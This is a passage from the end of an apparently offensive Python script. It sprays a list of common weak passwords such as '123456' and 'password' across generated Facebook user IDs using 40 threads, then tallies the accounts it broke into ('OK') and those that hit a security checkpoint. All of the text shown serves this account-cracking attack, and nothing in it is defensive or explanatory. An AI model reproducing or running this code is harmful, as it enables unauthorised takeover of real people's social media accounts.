    print(f"{WHITE}[ ! ] METHOD CHOICE           : 1")
    print(f"{WHITE}[ ! ] HOST NAME               : {device_info()[0]}")
    print(f"{WHITE}[ ! ] DEVICE ARCHITECTURE     : {device_info()[3]}")
    print(f"{WHITE}[ ! ] DEVICE SYSTEM           : {device_info()[1]}")
    print(f"{RED}[ ! ] FOR CANCEL PRESS CTRL + Z")
    with ThreadPoolExecutor(max_workers=40) as robot:
        for digit in user:
            uid = str("10000")+str(digit)
            pwx = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
            robot.submit(my_facebook, uid, pwx)
    print(f"{WHITE}\n==================================================")
    print(f"{WHITE} [!] PROCESS COMPLETED SUCCESSFULLY")
    print(f"{GREEN} [!] TOTAL OKEY IDS     : {str(len(ok))}")
    print(f"{RED} [!] TOTAL CHECKPOINT IDS : {str(len(cp))}")
    liner(50)
    print(f"{RED} [!] PRESS ENTER TO RETURN MAIN MENU:");input(" ");start()
            





if __name__ == "__main__":
    main()
